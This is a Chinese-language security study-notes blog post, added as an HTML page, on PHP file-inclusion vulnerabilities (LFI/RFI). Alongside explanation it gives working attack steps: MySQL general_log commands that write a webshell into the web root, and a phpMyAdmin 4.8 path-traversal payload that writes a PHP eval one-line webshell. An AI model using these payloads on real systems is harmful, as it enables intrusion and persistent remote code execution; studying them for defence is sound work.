@@ -1,0 +1,60 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>任意文件包含漏洞 | ooqo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><div class="darkmode-toggle">🌓</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
+var toggle = document.querySelector('.darkmode-toggle');
+var html = document.querySelector('html');
+
+html.dataset.dark = localStorage.dark || prefersDarkMode.matches;
+
+toggle.addEventListener('click', () => {
+localStorage.dark = !(html.dataset.dark == 'true');
+html.dataset.dark = localStorage.dark;
+});</script><meta name="generator" content="Hexo 7.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">任意文件包含漏洞</h1><a id="logo" href="/.">ooqo</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 主页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">任意文件包含漏洞</h1><div class="post-meta">2024-01-26<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 552</span><span class="post-meta-item-text"> Words</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 2</span><span class="post-meta-item-text"> Minutes</span></span></span></div><div class="post-content"><p>文件包含（不是漏洞 是功能）</p>
+<p>相同代码重复出现在不同文件 冗余 -&gt;文件包含 更高效</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p> include()  –临时加载引用  包含文件不存在 仍会往下执行</p>
+<p>require()  –在运行php之前读取文件一起执行 包含文件不存在,停止</p>
+<p>只包含一次：</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>1.php</p>
+<p><code>&lt;?php</code><br><code>echo &#39;a&#39;;</code><br><code>?&gt;</code></p>
+<p>2.php</p>
+<p><code>&lt;?php</code><br><code>echo &#39;aaaaaaaaaaaaa&lt;br/&gt;&#39;;</code></p>
+<p><code>include(&#39;1.php&#39;);</code><br><code>echo &#39;       aaaaaaaaaaaaa   &#39;;</code><br><code>?&gt;</code></p>
+<p>任意文件包含(漏洞) :可以通过目标包含**文件</p>
+<p>RFI&#x2F;LFI -&gt;远程文件包含  本地文件包含</p>
+<p>R –remote                 L–localhost</p>
+<p>本地文件包含:要包含的文件必须在目标主机上</p>
+<p>远程文件包含：无论文件在哪里只要能访问到 </p>
+<p>​		php默认不开启  [开启 allow_url_include&#x3D;On]</p>
+<p>​		*php伪协议 php:&#x2F;&#x2F;input</p>
+<p>危害：</p>
+<p>任意文件都可被当作php执行</p>
+<h2 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h2><p>1.路径判断</p>
+<p>sadhjb&#x2F;..&#x2F;   当前目录</p>
+<p>cmd中的路径可包含特殊字符(除&amp;和中文字符   &amp;表示几条命令同时执行)</p>
+<p>php中路径不可包含特殊字符</p>
+<p>2.XX::xxxx php调用类里的方法</p>
+<p>3.GET传参原本会url解码一次</p>
+<h2 id="PHPMYADMIN"><a href="#PHPMYADMIN" class="headerlink" title="PHPMYADMIN"></a>PHPMYADMIN</h2><h3 id="高权限-日志写shell法"><a href="#高权限-日志写shell法" class="headerlink" title="高权限:日志写shell法"></a>高权限:日志写shell法</h3><p>​	1.路径 不知道网站根目录没办法</p>
+<p>​	2.没有root权限 没法设置</p>
+<p>general_log 开启</p>
+<p>general_log_file </p>
+<p>1.查看general log是否开启</p>
+<p>show variables like ‘%general%’;</p>
+<p>2.打开general_log日志读写功能</p>
+<p>SET global general_log&#x3D;‘on’; </p>
+<p>3.写shell，会把执行的语句写到shell.php，然后我们查询一下</p>
+<p>SET GLOBAL general_log_file&#x3D;‘C:&#x2F;&#x2F;phpStudy&#x2F;&#x2F;PHPTutorial&#x2F;&#x2F;WWW&#x2F;&#x2F;shell.php’;</p>
+<h3 id="文件包含法-phpmyadmin-4-8及其以下存在的漏洞"><a href="#文件包含法-phpmyadmin-4-8及其以下存在的漏洞" class="headerlink" title="文件包含法(phpmyadmin 4.8及其以下存在的漏洞)"></a>文件包含法(phpmyadmin 4.8及其以下存在的漏洞)</h3><p>​	1.无权限 </p>
+<p>​	2.无路径要求</p>
+<p>​	代码审计 include require 找可控的地方</p>
+<p>​     例 <code>?target=da.php%253Faa/../../../../../../../../../数据库表的路径&amp;8=phpinfo();</code>      多写几个..&#x2F;跳出</p>
+<p>​	datadir找数据库的存储路径 建表(字段搞一句话木马)</p>
+<p><code>?target=da.php%253Faa/../../../../../../../../../数据库表的路径&amp;8=phpinfo();</code> 此时菜刀连接会报错 需要登录</p>
+<p><code>?target=da.php%253Faa/../../../../../../../../../数据库表的路径&amp;8=file_put_contents(&#39;zry.php&#39;,&#39;&lt;?php eval($_GET[8])?&gt;;&#39;)</code>  –写出的文件就在当前目录</p>
+</div><script type="text/javascript" src="/js/share.js?v=1.0.0" async></script><a class="article-share-link" data-url="http://example.com/2024/01/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cls2olw6c0005pssn2chd6lib" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrElEQVR42u3cS27kMAwFQN//0p1tgMCdR1LsOEB5NejxR6WFJT8Sua74eP048jO/n//z2rtz7s68Ng48PDy88dCTR77/JUdWJyIfMx4eHt427+6NmpyTDyV5ynw8eHh4eE/jTdjVxeD9IoSHh4f3X3jVwCKPG3I8Hh4e3hN4k/hg8r9JTFwNPvDw8PC2eXkV6Tn/Xqnv4eHh4Y2r6tUtcl7cqhbVmqPFw8PDW+DNg4ZeDDF5q+dX4eHh4W3wklskr+lk6NWi17yRCw8PD2+DV/3gT7bFvSbU3poWLTN4eHh4R3lJOT8PF/KrqpP4fmqibwU8PDy8o7xeGb4HmE/W4QIYHh4e3phXbXXqbX/zTfakwQsPDw9vgxfVx1oLQ37neZGsnLvg4eHhHeIlw8rLY2ef0vskwMPDw9vg5dvTSSmreucktI2mGA8PD+8jvF5Em2+jqy1ceQBx21OGh4eHt8yrDnRe+uoFytFGHA8PD2+BV41Ke4FsLxTuRRhlJB4eHl6LV10e8kFUh1VdKqJFAg8PD+8ob6MtNS+SVYthSbRx21OGh4eHt8brxQp5KetUA2vUlICHh4f3Ed6kFWD+os9bBPDw8PD+ijdpLZ2UzSZh8WLpCw8PDy/mVVujJshJ00CyWS9EEnh4eHiHeL1AIW/GqobC1SLc1esvwMPDw3ud+fOjecFpwpj0hUVBMB4eHt5HePnCkCcAvUmZIPHw8PA2eK/ikS8k+VXVWLkQHOPh4eEt8Hq37t00WSqSVoNJewEeHh7eKV5vMciHeypWaD4XDw8Pb43Xqxz1loRJ0+pi7xgeHh7eB3kJoxoB57/8MtF4eHh4D+DlL/33v+RXFTDzhQEPDw9v0K6at6X2wt/qnZvPwsPDw1vgnfqir26aJw0K19kDDw8PL+V9AVWrDQGI66ZEAAAAAElFTkSuQmCC">Share</a><div class="tags"></div><div class="post-nav"><a class="next" href="/2024/01/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">代码执行漏洞</a></div><script src="https://utteranc.es/client.js" repo="123library/123library.github.io" issue-term="title" theme="github-light" crossorigin="anonymous" async></script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="About"><img class="nofancybox" src="/img/head.jpg"/></a><p>永远探索，永远好奇。</p><a class="info-icon" title="Twitter" target="_blank" style="margin-inline:5px"> <i class="fa fa-twitter-square" style="margin-inline:5px"></i></a><a class="info-icon" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a><a class="info-icon" title="RSS" target="_blank" style="margin-inline:5px"> <i class="fa fa-rss-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/01/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">任意文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/01/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">代码执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/12/21/XXE/">XXE</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/12/20/ssrf/">ssrf</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/12/19/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E3%80%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">支付漏洞、越权漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/12/18/hello/">hello</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a title="暂无" target="_blank">暂无</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2024 <a href="/." rel="nofollow">ooqo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0"></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+  search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="/js/copycode.js?v=1.0.0" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=1.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>
